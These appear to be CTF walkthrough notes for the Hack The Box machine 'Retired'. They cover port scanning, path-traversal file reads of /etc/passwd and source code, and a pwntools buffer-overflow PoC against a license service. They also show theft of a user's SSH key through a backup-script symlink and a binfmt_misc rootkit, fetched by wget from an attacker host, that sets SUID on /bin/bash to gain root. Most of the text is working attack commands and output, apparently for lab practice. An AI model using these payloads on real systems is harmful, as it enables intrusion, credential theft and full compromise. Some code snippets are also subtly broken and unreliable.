# scanning
* `TCP` Scan
TARGET=10.10.11.154 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

> for p in {1..65535}; do nc -vn 10.10.11.154 $p -w 1 -z & done 2> output.txt

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5 (protocol 2.0)

## 80/tcp open  http    syn-ack ttl 63 nginx
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
| http-methods: 
|_  Supported Methods: GET HEAD POST


> dirsearch -u http://10.10.11.154 -f -x 403,401,500,400
[13:15:31] 301 -  162B  - /js  ->  http://10.10.11.154/js/
[13:16:44] 301 -  162B  - /assets  ->  http://10.10.11.154/assets/
[13:16:46] 200 -    4KB - /beta.html
[13:16:56] 301 -  162B  - /css  ->  http://10.10.11.154/css/
[13:16:59] 200 -   11KB - /default.html
[13:17:11] 302 -    0B  - /index.php  ->  /index.php?page=default.html


```
GET /index.php?page=../../../../../../../../../../etc/passwd HTTP/1.1
Host: 10.10.11.154
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000::/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dev:x:1001:1001::/home/dev:/bin/bash
```

* /index.php?page=../../../../../../../../../../var/www/html/index.php
```php
<?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?>
```

* /index.php?page=../../../../../../../../../../var/www/html/activate_license.php
```php
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```


```
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
	worker_connections 768;
}

http {
	sendfile on;
	tcp_nopush on;
	types_hash_max_size 2048;
	server_tokens off;

	server_names_hash_bucket_size 64;
	server_name_in_redirect off;

	include /etc/nginx/mime.types;
	default_type application/octet-stream;

	access_log /var/log/nginx/access.log;
	error_log /var/log/nginx/error.log;

	gzip on;

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;
}
```

* http://10.10.11.154/index.php?page=../../../../../../../../../../var/www/html/activate_license.php

* /index.php?page=../../../../../../../../../../proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-5.10.0-11-amd64 root=UUID=a84f7c88-6f49-48b7-adc4-39d9662b74e1 ro consoleblank=0 elevator=noop scsi_mod.use_blk_mq=Y net.ifnames=0 biosdevname=0

* /proc/version
Linux version 5.10.0-11-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.92-2 (2022-02-28)

for p in {1..65535}; do curl http://10.10.11.154/index.php?page=../../../../../../../../../../proc/$p/cmdline & done


> curl http://10.10.11.154/index.php?page=../../../../../../../../../../proc/[100-500]/cmdline

curl http://10.10.11.154/index.php?page=../../../../../../../../../../proc/486/cmdline --output 486
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    31    0    31    0     0    130      0 --:--:-- --:--:-- --:--:--   130
root@kali:~/workspace# cat 486 
/usr/bin/activate_license 1337

license.sqlite

# reverse
```c++
void activate_license(int sockfd)

{
  int iVar1;
  ssize_t sVar2;
  int *piVar3;
  char *pcVar4;
  sqlite3_stmt *stmt;
  sqlite3 *db;
  uint32_t msglen;
  char buffer [512];
  
  sVar2 = read(sockfd,&msglen,4);
  if (sVar2 == -1) {
    piVar3 = __errno_location();
    pcVar4 = strerror(*piVar3);
    error(pcVar4);
  }
  msglen = ntohl(msglen);
  printf("[+] reading %d bytes\n",(ulong)msglen);
  sVar2 = read(sockfd,buffer,(ulong)msglen);
  if (sVar2 == -1) {
    piVar3 = __errno_location();
    pcVar4 = strerror(*piVar3);
    error(pcVar4);
  }
  iVar1 = sqlite3_open("license.sqlite",&db);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  sqlite3_busy_timeout(db,2000);
  iVar1 = sqlite3_exec(db,
                       "CREATE TABLE IF NOT EXISTS license (   id INTEGER PRIMARY KEY AUTOINCREMENT,    license_key TEXT)"
                       ,0,0,0);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_prepare_v2(db,"INSERT INTO license (license_key) VALUES (?)",0xffffffff,&stmt,0);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_bind_text(stmt,1,buffer,0x200,0);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_step(stmt);
  if (iVar1 != 0x65) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_reset(stmt);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_finalize(stmt);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  iVar1 = sqlite3_close(db);
  if (iVar1 != 0) {
    pcVar4 = (char *)sqlite3_errmsg(db);
    error(pcVar4);
  }
  printf("[+] activated license: %s\n",buffer);
  return;
}
```


If you've got a copy of the ELF and using python + PWNTools:
./activate_license 1337


## Python
from pwn import *

r = remote('127.0.0.1',1337)
gdb.attach(r) # debug in gdb

That will pop a GDB window already attached, assuming the remote connection works.
then you set your breaks and go.

else if not pwntools, but plain python.
./activate_license 1337



import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect('127.0.0.1',1337))
gdb.attach(s) # debug in gdb

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Usage: python3 poc.py [DEBUG]

from pwn import *

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64


offset = 800
size = p32(offset, endian='big')

payload = b''
payload += size
payload += b'A' * 520
payload += p64(0xd34dc0d3)

r = remote('localhost', 1337)
r.sendline(payload)
r.sendline()
```

```
556999036000-556999037000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
556999037000-556999038000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
556999038000-556999039000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
556999039000-55699903a000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
55699903a000-55699903b000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
55699a07b000-55699a09c000 rw-p 00000000 00:00 0                          [heap]
7fa10125d000-7fa10125f000 rw-p 00000000 00:00 0 
7fa10125f000-7fa101260000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7fa101260000-7fa101262000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7fa101262000-7fa101263000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7fa101263000-7fa101264000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7fa101264000-7fa101265000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7fa101265000-7fa10126c000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7fa10126c000-7fa10127c000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7fa10127c000-7fa101281000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7fa101281000-7fa101282000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7fa101282000-7fa101283000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7fa101283000-7fa101287000 rw-p 00000000 00:00 0 
7fa101287000-7fa101296000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7fa101296000-7fa101330000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7fa101330000-7fa1013c9000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7fa1013c9000-7fa1013ca000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7fa1013ca000-7fa1013cb000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7fa1013cb000-7fa1013f0000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fa1013f0000-7fa10153b000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fa10153b000-7fa101585000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fa101585000-7fa101586000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fa101586000-7fa101589000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fa101589000-7fa10158c000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7fa10158c000-7fa101590000 rw-p 00000000 00:00 0 
7fa101590000-7fa1015a0000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fa1015a0000-7fa101698000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fa101698000-7fa1016cc000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fa1016cc000-7fa1016d0000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fa1016d0000-7fa1016d3000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7fa1016d3000-7fa1016d5000 rw-p 00000000 00:00 0 
7fa1016da000-7fa1016db000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fa1016db000-7fa1016fb000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fa1016fb000-7fa101703000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fa101704000-7fa101705000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fa101705000-7fa101706000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7fa101706000-7fa101707000 rw-p 00000000 00:00 0 
7ffdc054d000-7ffdc056e000 rw-p 00000000 00:00 0                          [stack]
7ffdc05e7000-7ffdc05eb000 r--p 00000000 00:00 0                          [vvar]
7ffdc05eb000-7ffdc05ed000 r-xp 00000000 00:00 0                          [vdso]
```

Just read base addresses from /proc/<id>/maps using LFI
486

# pe 
dev runs "/usr/bin/webbackup" which takes a backup of the web directory and saves the zip file in "/var/www/" folder ... create a symlink of dev's ssh key in "/var/www/html" folder , copy the new zip file to /dev/shm and unzip it. you will find dev's ssh key in "/var/www/html/"

> cat /usr/bin/webbackup
```bash
#!/bin/bash
set -euf -o pipefail

cd /var/www/

SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"

/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"

KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```

> ln -s /home/dev/.ssh/id_rsa /var/www/html/id_rsa
> cp /var/www/latest.zip /dev/shm
> cd /dev/shm
* unzip latest.zip

cat user.txt

> cat reg_helper.c 
```c++
#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    char cmd[512] = { 0 };

    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;

    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");

    return 0;
}
```

> find / -type f -name reg_helper
/usr/lib/emuemu/reg_helper

:APE:M::MZqFpD::chmod u+s /bin/bash:

echo ':APE:M::MZqFpD::chmod u+s /bin/bash:' | /usr/lib/emuemu/reg_helper

* https://github.com/toffan/binfmt_misc/blob/master/binfmt_rootkit
* modify script
`echo "$binfmt_line" | /usr/lib/emuemu/reg_helper`

wget http://10.10.x.x/binfmt_rootkit -O binfmt_rootkit
--2022-05-04 23:26:05--  http://10.10.x.x/binfmt_rootkit
Connecting to 10.10.x.x:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2053 (2.0K) [application/octet-stream]
Saving to: ‘binfmt_rootkit’

binfmt_rootkit                             100%[=====================================================================================>]   2.00K  --.-KB/s    in 0.04s   

2022-05-04 23:26:05 (47.4 KB/s) - ‘binfmt_rootkit’ saved [2053/2053]

dev@retired:~$ ls -ls
total 16
4 drwx------ 2 dev  dev 4096 Mar 11 14:36 activate_license
4 -rwxr-xr-x 1 dev  dev 2053 May  4 23:23 binfmt_rootkit
4 drwx------ 3 dev  dev 4096 Mar 11 14:36 emuemu
4 -rw-r----- 1 root dev   33 May  4 04:34 user.txt
dev@retired:~$ ./binfmt_rootkit
uid=0(root) euid=0(root)
# id
uid=0(root) gid=1001(dev) groups=1001(dev),33(www-data)
# cd /root
# ls
cleanup.sh  root.txt
# cat root.txt



# hints
Foothold to shell

it’s been leaked on the forum already → dirbuster to find a page then look at what this page calls then L… to find a particular process
find the process and the program that goes along
make it get us a shell [that’s the hard part!]
Lateral: shell to user

very easy, just look around to see some files are regularly written somewhere
exploit it
Root

fun root privesc
don’t need any linpeas, just work with what you have in front of you when you get user
google around the bin you don’t recognize and read the content of every file

So NX and PIE are enabled on the ELF binary, meaning we can't do a standard Buffer overflow.. is that right??

Buffer is 512+ bytes to overflow and once overflowed it is no longer stored in sqllite as a blob, but the full string so you can see it there, as well as via GDB.

You need to send the size in big endian 32bit before, read the php file

root you just have to exploit binfmt_misc

You can use mprotect to unlock entire stack adn then JMP RSP to run reverse shell. There are more libraries than just libc. Other ones can give you more gadgets.